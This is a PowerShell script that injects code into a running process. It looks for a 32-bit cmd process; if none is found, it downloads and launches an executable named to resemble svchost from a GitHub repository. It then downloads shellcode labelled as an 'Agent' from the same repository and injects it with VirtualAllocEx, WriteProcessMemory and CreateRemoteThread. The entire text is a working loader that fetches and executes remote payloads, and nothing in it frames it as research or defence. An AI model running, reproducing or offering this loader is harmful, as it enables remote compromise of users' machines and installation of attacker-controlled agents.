# --- Step 1: Add IsWow64Process API to check process architecture ---
$apiCode = @"
using System;
using System.Runtime.InteropServices;
public class ProcessChecker {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
}
"@
Add-Type $apiCode

# --- Step 2: Try to find a candidate 32-bit process (using "cmd") ---
$candidateProcesses = Get-Process -Name "cmd" -ErrorAction SilentlyContinue
$targetProcess = $null

foreach ($proc in $candidateProcesses) {
    try {
        # Attempt to open the process handle (access may be denied on some processes)
        $handle = $proc.Handle  
        $isWow64 = $false
        if ([ProcessChecker]::IsWow64Process($handle, [ref]$isWow64)) {
            if ($isWow64) {
                $targetProcess = $proc
                break
            }
        }
    }
    catch {
        # Skip processes where we can't check the architecture
        continue
    }
}

# --- Step 3: If no 32-bit candidate found, download & launch our test app ---
if (-not $targetProcess) {
    Write-Host "No 32-bit process found from candidate list. Downloading and launching test application..."
    
    $testAppUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/scvhoster.exe"
    $tempPath = "$env:TEMP\scvhoster.exe"
    Invoke-WebRequest -Uri $testAppUrl -OutFile $tempPath
    Write-Host "Test app downloaded to $tempPath. Launching..."
    
    Start-Process -FilePath $tempPath
    Start-Sleep -Seconds 3
    
    # Now try to find the process; our test app is assumed to be named "main"
    $targetProcess = Get-Process -Name "main" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $targetProcess) {
        Write-Host "Failed to locate the test process after launching." -ForegroundColor Red
        exit
    }
}

$targetPID = $targetProcess.Id
Write-Host "Using target process with PID: $targetPID"

# --- Step 4: Download Shellcode (Agent) ---
$agentUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/winner.bin"
Write-Host "Downloading shellcode from $agentUrl..."
$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData($agentUrl)
Write-Host "Shellcode downloaded: $($shellcode.Length) bytes."

# --- Step 5: Define Win32 API Functions via Add-Type ---
$signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $signature

# --- Step 6: Define Constants and Open Target Process ---
$PROCESS_ALL_ACCESS    = 0x1F0FFF
$MEM_COMMIT            = 0x1000
$MEM_RESERVE           = 0x2000
$PAGE_EXECUTE_READWRITE= 0x40

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open target process." -ForegroundColor Red
    exit
}
Write-Host "Target process opened successfully."

# --- Step 7: Allocate Memory in the Target Process ---
$size = $shellcode.Length
$allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
if ($allocAddress -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation failed." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host ("Allocated {0} bytes at address {1}" -f $size, $allocAddress)

# --- Step 8: Write Shellcode into the Allocated Memory ---
[int]$bytesWritten = 0
$result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $shellcode.Length) {
    Write-Host "Failed to write shellcode to target process memory." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Shellcode written successfully to target process memory."

# --- Step 9: Create a Remote Thread to Execute the Shellcode ---
$threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Remote thread created. Shellcode injected and executing!"

# --- Step 10: Clean Up ---
[Win32]::CloseHandle($hProcess)
